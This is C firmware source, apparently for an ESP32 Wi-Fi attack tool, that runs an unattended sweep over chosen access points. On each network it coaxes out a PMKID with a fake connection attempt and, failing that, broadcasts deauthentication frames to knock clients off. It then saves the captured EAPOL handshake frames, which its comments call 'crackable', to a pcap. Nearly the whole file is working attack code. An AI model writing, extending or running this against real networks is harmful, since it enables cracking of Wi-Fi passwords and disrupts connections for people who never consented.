/**
 * @file attack_hunt.c
 * @author y4n0
 * @date 2026
 * @copyright Copyright (c) 2026
 *
 * @brief Unattended PMKID + handshake capture sweep.
 */

#include "attack_hunt.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "attack.h"
#include "attack_method.h"
#include "management_helper.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "pcap_serializer.h"

static const char *TAG = "main:hunt";

typedef struct {
    wifi_ap_record_t ap;
    bool             pmkid;
    uint8_t          eapol;
    uint8_t          client_eapol;
} hunt_target_t;

/* A handshake pcap is a few KB. Anything past this is noise from a busy
 * channel and would only eat the heap the web server needs. */
#define HUNT_PCAP_LIMIT (160 * 1024)

static hunt_target_t      s_targets[HUNT_MAX_TARGETS];
static volatile uint8_t   s_target_count = 0;
static volatile bool      s_running      = false;
static volatile bool      s_pmkid_seen   = false;
static volatile uint8_t   s_eapol_count  = 0;
static volatile uint8_t   s_client_eapol = 0;
static volatile bool      s_restored     = false;
static TaskHandle_t       s_task         = NULL;

/* ─────────────────────────── capture path ────────────────────────────────── */

/**
 * True when the frame carries an EAPOL payload (EtherType 0x888E).
 *
 * EAPOL sits behind an 802.2 LLC/SNAP header, so the ethertype is not at a
 * fixed offset: plain data frames put it at 30, QoS data frames at 32. Scanning
 * the first few header bytes for the SNAP prefix handles both without a full
 * 802.11 parser.
 */
static bool frame_is_eapol(const uint8_t *payload, unsigned len)
{
    if (payload == NULL || len < 36) return false;

    for (unsigned i = 24; i + 8 <= len && i < 36; i++) {
        if (payload[i]     == 0xAA && payload[i + 1] == 0xAA &&
            payload[i + 2] == 0x03 && payload[i + 3] == 0x00 &&
            payload[i + 4] == 0x00 && payload[i + 5] == 0x00 &&
            payload[i + 6] == 0x88 && payload[i + 7] == 0x8E) {
            return true;
        }
    }
    return false;
}

/**
 * Raw sniffer tap.
 *
 * frame_analyzer only forwards EAPOL frames as events while it is in
 * SEARCH_HANDSHAKE mode, which would leave every PMKID-bearing message 1 out of
 * the pcap. Tapping the sniffer directly captures both phases into one file.
 */
static void hunt_data_handler(void *args, esp_event_base_t base, int32_t id, void *data)
{
    if (!s_running || data == NULL) return;

    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)data;
    unsigned len = frame->rx_ctrl.sig_len;

    if (len == 0 || len > 1600) return;
    if (!frame_is_eapol(frame->payload, len)) return;

    if (s_eapol_count < 0xFF) s_eapol_count++;

    /* ToDS set means the frame travels client -> AP, i.e. message 2 or 4.
     * A complete, crackable handshake needs at least one of those. */
    if ((frame->payload[1] & 0x01) && s_client_eapol < 0xFF) s_client_eapol++;

    if (pcap_serializer_get_size() < HUNT_PCAP_LIMIT) {
        pcap_serializer_append_frame(frame->payload, len, frame->rx_ctrl.timestamp);
    }
}

static void hunt_pmkid_handler(void *args, esp_event_base_t base, int32_t id, void *data)
{
    if (!s_running || data == NULL) return;

    s_pmkid_seen = true;

    /* The analyzer hands us ownership of a linked list; drop it, we only need
     * the fact that a PMKID exists. The frame itself is already in the pcap. */
    pmkid_item_t *item = *(pmkid_item_t **)data;
    while (item != NULL) {
        pmkid_item_t *next = item->next;
        free(item);
        item = next;
    }
}

/* ─────────────────────────── helpers ─────────────────────────────────────── */

/** Waits @p total_ms in slices, returning true as soon as @p flag goes true. */
static bool wait_for(volatile bool *flag, uint32_t total_ms)
{
    const uint32_t slice = 250;
    for (uint32_t waited = 0; waited < total_ms; waited += slice) {
        if (!s_running) return false;
        if (flag != NULL && *flag) return true;
        vTaskDelay(pdMS_TO_TICKS(slice));
    }
    return (flag != NULL && *flag);
}

/** Waits @p total_ms for at least @p need client-originated EAPOL frames. */
static bool wait_for_client_eapol(uint8_t need, uint32_t total_ms)
{
    const uint32_t slice = 250;
    for (uint32_t waited = 0; waited < total_ms; waited += slice) {
        if (!s_running) return false;
        if (s_client_eapol >= need) return true;
        vTaskDelay(pdMS_TO_TICKS(slice));
    }
    return s_client_eapol >= need;
}

static void report(const char *line)
{
    attack_append_status_content((uint8_t *)line, strlen(line));
}

/* ─────────────────────────── sweep worker ────────────────────────────────── */

static void hunt_task(void *arg)
{
    uint8_t total = s_target_count;

    for (uint8_t i = 0; i < total && s_running; i++) {
        hunt_target_t *t = &s_targets[i];

        if (t->ap.primary < 1 || t->ap.primary > 14) {
            ESP_LOGW(TAG, "Skipping %s - no usable channel", t->ap.ssid);
            continue;
        }

        ESP_LOGI(TAG, "[%u/%u] Hunting %s (ch %u)", i + 1, total, t->ap.ssid, t->ap.primary);

        s_pmkid_seen   = false;
        s_eapol_count  = 0;
        s_client_eapol = 0;

        wifictl_sniffer_filter_frame_types(true, false, false);
        wifictl_sniffer_start(t->ap.primary);

        /* ── phase 1: PMKID ───────────────────────────────────────────────── */
        frame_analyzer_capture_start(SEARCH_PMKID, t->ap.bssid);
        wifictl_sta_connect_to_ap(&t->ap, "dummypassword");

        t->pmkid = wait_for(&s_pmkid_seen, HUNT_PMKID_GRACE_MS);

        frame_analyzer_capture_stop();
        wifictl_sta_disconnect();

        if (t->pmkid) {
            ESP_LOGI(TAG, "PMKID recovered from %s", t->ap.ssid);
        }

        /* ── phase 2: handshake ───────────────────────────────────────────── */
        if (!t->pmkid && s_running) {
            frame_analyzer_capture_start(SEARCH_HANDSHAKE, t->ap.bssid);
            attack_method_broadcast(&t->ap, 1);

            wait_for_client_eapol(1, HUNT_HS_WAIT_MS);

            attack_method_broadcast_stop();
            frame_analyzer_capture_stop();
        }

        t->eapol        = s_eapol_count;
        t->client_eapol = s_client_eapol;
        wifictl_sniffer_stop();

        /* ── report line ──────────────────────────────────────────────────── */
        char line[96];
        const char *verdict;

        if (t->pmkid)                     verdict = "PMKID";
        else if (t->client_eapol >= 1)    verdict = "HANDSHAKE";
        else if (t->eapol > 0)            verdict = "PARTIAL";
        else                              verdict = "NO DATA";

        snprintf(line, sizeof(line), "%-20.20s ch%-2u %-10s eapol=%u\n",
                 (const char *)t->ap.ssid, t->ap.primary, verdict, t->eapol);
        report(line);

        ESP_LOGI(TAG, "Result: %s", line);

        vTaskDelay(pdMS_TO_TICKS(150));
    }

    esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_DATA, &hunt_data_handler);
    esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &hunt_pmkid_handler);

    bool finished = s_running;

    s_running = false;
    s_task    = NULL;

    if (finished) {
        char tail[64];
        snprintf(tail, sizeof(tail), "\nSweep complete. PCAP: %u bytes\n",
                 pcap_serializer_get_size());
        report(tail);
        attack_update_status(FINISHED);

        /* The management AP was taken down for the sweep, so bring the whole
         * stack back exactly once, after the results are already in the status
         * buffer. The UI reconnects and reads them from /status. */
        s_restored = true;
        restore_management_system();
    } else {
        report("\nSweep aborted.\n");
    }

    vTaskDelete(NULL);
}

/* ─────────────────────────── lifecycle ───────────────────────────────────── */

void attack_hunt_start(attack_config_t *attack_config)
{
    if (s_running) {
        ESP_LOGW(TAG, "Hunt already running");
        return;
    }
    if (attack_config == NULL || attack_config->target_count == 0) {
        ESP_LOGE(TAG, "Hunt needs at least one target AP");
        attack_update_status(FINISHED);
        return;
    }

    s_target_count = 0;
    for (uint8_t i = 0; i < attack_config->target_count && i < HUNT_MAX_TARGETS; i++) {
        const wifi_ap_record_t *src = attack_config->ap_records[i];
        if (src == NULL) continue;
        memcpy(&s_targets[s_target_count].ap, src, sizeof(wifi_ap_record_t));
        s_targets[s_target_count].pmkid        = false;
        s_targets[s_target_count].eapol        = 0;
        s_targets[s_target_count].client_eapol = 0;
        s_target_count++;
    }

    if (s_target_count == 0) {
        ESP_LOGE(TAG, "Hunt: no usable targets");
        attack_update_status(FINISHED);
        return;
    }

    pcap_serializer_deinit();
    pcap_serializer_init();

    esp_wifi_set_ps(WIFI_PS_NONE);

    /* The radio can't promiscuously capture and serve the management AP at the
     * same time - wifictl_sniffer_start() kicks every associated client on
     * every channel hop anyway. Take the AP down for the run; the worker
     * restores the full stack when the sweep ends. */
    wifictl_mgmt_ap_stop();

    s_restored = false;

    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS,
                                               SNIFFER_EVENT_CAPTURED_DATA,
                                               &hunt_data_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS,
                                               DATA_FRAME_EVENT_PMKID,
                                               &hunt_pmkid_handler, NULL));

    char head[72];
    snprintf(head, sizeof(head), "Hunting %u target(s)\n", s_target_count);
    report(head);

    s_running = true;
    xTaskCreate(hunt_task, "attack_hunt", 6144, NULL, 5, &s_task);

    ESP_LOGI(TAG, "Hunt started over %u target(s)", s_target_count);
}

void attack_hunt_stop(void)
{
    if (!s_running) return;
    s_running = false;

    /* Give the worker a moment to unwind its own sniffer/analyzer state
     * before the caller hands the radio back to the management AP. */
    for (int i = 0; i < 40 && s_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (s_task != NULL) {
        vTaskDelete(s_task);
        s_task = NULL;
    }

    attack_method_broadcast_stop();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();

    esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_DATA, &hunt_data_handler);
    esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &hunt_pmkid_handler);

    /* The sweep takes the management AP down for the whole run, so the abort
     * path has to put it back. The completion path restores it itself and
     * raises this flag, so a stop landing at the same instant doesn't tear the
     * stack down twice. */
    if (!s_restored) {
        s_restored = true;
        restore_management_system();
    }

    ESP_LOGI(TAG, "Hunt stopped");
}

bool attack_hunt_is_running(void)
{
    return s_running;
}
